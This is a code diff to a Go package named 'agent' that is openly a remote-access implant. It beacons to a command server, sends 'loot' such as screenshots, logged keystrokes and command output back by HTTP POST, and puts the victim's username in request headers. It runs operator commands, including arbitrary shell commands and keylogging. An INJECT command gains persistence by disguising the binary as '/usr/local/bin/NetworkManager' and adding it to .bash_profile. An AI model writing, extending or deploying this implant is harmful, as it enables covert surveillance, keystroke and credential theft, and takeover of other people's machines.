@@ -2,13 +2,12 @@ package agent
 
 import (
 	"bytes"
-	"fmt"
 	"io"
 	"log/slog"
 	"math/rand/v2"
 	"net/http"
 	"os"
-	"os/exec"
+	"strconv"
 	"strings"
 	"time"
 
@@ -28,8 +27,16 @@ type Loot struct {
 	Content string
 }
 
+type ClientState struct {
+	Username      string
+	IsLoggingKeys bool
+	PreviousKeys  string
+}
+
+var state ClientState
+
 func makeRequest() {
-	requestURL := "http://" + config.Host + ":" + config.Port
+	requestURL := "http://" + config.Host + ":" + config.BeaconPort
 	request, _ := http.NewRequest("GET", requestURL, nil)
 	setHeaders(*request)
 
@@ -49,10 +56,15 @@ func makeRequest() {
 		slog.Info("Sending loot to server")
 		if loot.Kind == "Image" {
 			buffer, _ := os.ReadFile(loot.Content)
-			_, err = http.Post(requestURL, "image/png", bytes.NewBuffer(buffer))
+			request, _ = http.NewRequest("POST", requestURL, bytes.NewBuffer(buffer))
+			request.Header.Set("Content-Type", "image/png")
 		} else {
-			_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(loot.Content)))
+			request, _ = http.NewRequest("POST", requestURL, bytes.NewBuffer([]byte(loot.Content)))
+			request.Header.Set("Content-Type", "text/plain")
 		}
+		setHeaders(*request)
+
+		_, err := http.DefaultClient.Do(request)
 		if err != nil {
 			slog.Info("Failed sending loot to server: " + err.Error())
 		} else {
@@ -63,27 +75,21 @@ func makeRequest() {
 	}
 }
 
-var username string
-
 func setHeaders(r http.Request) {
-	if username == "" {
-		slog.Info("Getting username")
-		username = executeCommand([]string{"whoami"})
+	if state.Username == "" {
+		slog.Info("Getting state.Username")
+		state.Username = strings.TrimSpace(ExecuteCommand([]string{"whoami"}))
 	}
-	username = strings.TrimSpace(username)
-	r.Header.Set("Username", username)
+	r.Header.Set("Username", state.Username)
 	go readKeys(r)
 }
 
-var isLoggingKeys bool
-var previousKeys string
-
 func readKeys(request http.Request) {
-	if isLoggingKeys {
+	if state.IsLoggingKeys {
 		var keysLoot string
 		mu.Lock()
-		keysLoot = strings.TrimPrefix(keysPressed, previousKeys)
-		previousKeys = keysPressed
+		keysLoot = strings.TrimPrefix(keysPressed, state.PreviousKeys)
+		state.PreviousKeys = keysPressed
 		mu.Unlock()
 		if len(keysPressed) != 0 {
 			request.Header.Set("Keys", keysLoot)
@@ -96,12 +102,22 @@ func runCommand(command []string) Loot {
 	var loot Loot
 	switch command[0] {
 	case "INJECT":
-		loot.Content = executeCommand([]string{"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"})
+		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"
+		loot.Content = ExecuteCommand([]string{injectCommand})
+	case "SESSION":
+		go JoinSession()
+	case "INTERVAL":
+		if len(command) > 1 {
+			interval, err := strconv.Atoi(command[1])
+			if err == nil {
+				config.Interval = interval
+			}
+		}
 	case "LOGKEYS":
-		isLoggingKeys = true
+		state.IsLoggingKeys = true
 		go LogKeyboard()
 	case "STOP-LOGKEYS":
-		isLoggingKeys = false
+		state.IsLoggingKeys = false
 		// TODO: Signal go routine to stop
 	case "SCREEN":
 		screenshots := CaptureScreen()
@@ -110,39 +126,10 @@ func runCommand(command []string) Loot {
 		loot.Content = screenshots[0]
 	default:
 		slog.Info("Executing command: " + command[0])
-		loot.Content = executeCommand(command)
+		loot.Content = ExecuteCommand(command)
 		slog.Info("Output:\n" + loot.Content)
 	}
 	slog.Info("Executed command")
 
 	return loot
-}
-
-func executeCommand(command []string) string {
-	var stdout bytes.Buffer
-	var stderr bytes.Buffer
-
-	var commandExists bool = false
-	var cmd *exec.Cmd
-	if len(command) != 0 {
-		command = append([]string{"-c"}, strings.Join(command, " "))
-		cmd = exec.Command("bash", command...)
-		commandExists = true
-	}
-
-	if commandExists {
-		cmd.Stdout = &stdout
-		cmd.Stderr = &stderr
-
-		err := cmd.Run()
-		if err != nil {
-			slog.Error("Failed executing command: " + err.Error())
-			fmt.Println(command)
-		}
-	}
-	if stderr.String() != "" {
-		slog.Info("Error Output: " + stderr.String())
-	}
-
-	return stdout.String() + stderr.String()
 }
